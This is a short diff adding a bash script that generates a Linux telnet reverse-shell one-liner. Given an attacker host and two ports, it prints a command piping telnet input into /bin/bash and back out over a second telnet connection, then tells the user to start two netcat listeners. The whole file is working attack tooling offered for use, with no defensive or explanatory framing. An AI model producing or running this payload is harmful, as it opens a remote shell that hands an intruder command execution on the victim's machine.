@@ -1,0 +1,26 @@
+#!/bin/bash
+
+function Craft_linux_telnet_reverse_shell(){
+
+        if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]
+        then
+                printf "Auto-gen Linux telnet reverse tcp shell\n"
+                printf "Usage bash linux_telnet-reverse-tcp <rhost> <rsendport> <rioport>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rsendport="$2"
+	rioport="$3"
+
+        printf "\n"
+	printf "telnet $rhost $rsendport | /bin/bash | telnet $rhost $rioport"
+        printf "\n\n[\e[0;32m+\e[0m] Payload created.\n\n"
+	printf "\e[0;33m"
+	printf "\e[4mYou need set up two netcat listeners\n"
+	printf "One to send commands in port $rsendport\n"
+	printf "The other one to receive stdout in port $rioport\e[0m\n"
+
+}
+
+Craft_linux_telnet_reverse_shell "$1" "$2" "$3"
